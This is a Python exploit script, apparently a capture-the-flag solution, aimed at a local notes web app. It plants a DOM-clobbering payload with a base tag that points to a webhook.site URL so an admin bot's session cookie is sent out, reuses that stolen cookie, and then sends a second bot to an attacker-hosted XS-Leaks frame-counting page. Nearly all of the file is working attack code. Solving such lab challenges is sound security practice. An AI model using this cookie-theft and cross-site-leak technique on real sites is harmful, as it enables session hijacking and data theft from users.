import httpx
import re
import bs4

c = httpx.Client()
def register(user):
    r = c.post("http://localhost:6969/api/register", json={"email": user['email'], "password": user['password']})
    print(r.text)

def login(user):
    r = c.post("http://localhost:6969/api/login", json={"email": user['email'], "password": user['password']})
    cookie = r.headers['Set-Cookie']
    c.headers.update({"Cookie": cookie})
    print("[+] Got Cookie:", cookie)

def send_cloberring_payload(payload):
    r = c.post("http://localhost:6969/api/usuario/note", json={"title": payload['title'], "content": payload['content']})
    print(r.text)

def attack_secretaria():
    print("[+] Make Dom Cloberrring Note")
    r1 = c.get("http://localhost:6969/usuario/notes")
    soup = bs4.BeautifulSoup(r1.text, 'html.parser')
    links = soup.find_all("a", href=True)
    uuid_pattern = re.compile(r'/getnote/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.IGNORECASE)
    uuids = [match.group(1) for link in links if (match := uuid_pattern.search(link['href']))]
    print("[+] Found UUIDs:", uuids)
    r2 = c.get(f"http://localhost:6969/bot/visit/secretaria?note="+uuids[0])
    print(r2.text)
    secretaria_cookie = input("[+] Enter Secretaria Cookie (check your webhook): ")
    c.headers.update({"Cookie": "passion_ticket="+secretaria_cookie})
    print("[+] Got Secretaria Cookie:", secretaria_cookie)

def attack_XSLeak(url):
    print("[+] Attack presidente note using XSleaks")
    r = c.get("http://localhost:6969/bot/visit/presidente?url="+url)
    print(r.text)

user = {
    "email":"gendra@ara6.com",
    "password":"ashura"
}

payload = {
    "title":"<iframe name=abortError srcdoc=\"<a id=stack name=stack><a id=stack name=stackTrace href=controlled>\"></iframe><base href='https://webhook.site/76ee9d15-df9b-4ac2-baf3-42bde54fa848/'>",
    "content":"aaaaaa"
}

xsleaks_payload_url = "https://webhook.site/91d6287f-517f-4844-a0ab-7a165ff43da9/"
register(user)
login(user)
send_cloberring_payload(payload)
attack_secretaria()
# exploit xsleaks frame counting, host the auto.html in a server, and change the url to your server :D
attack_XSLeak(xsleaks_payload_url)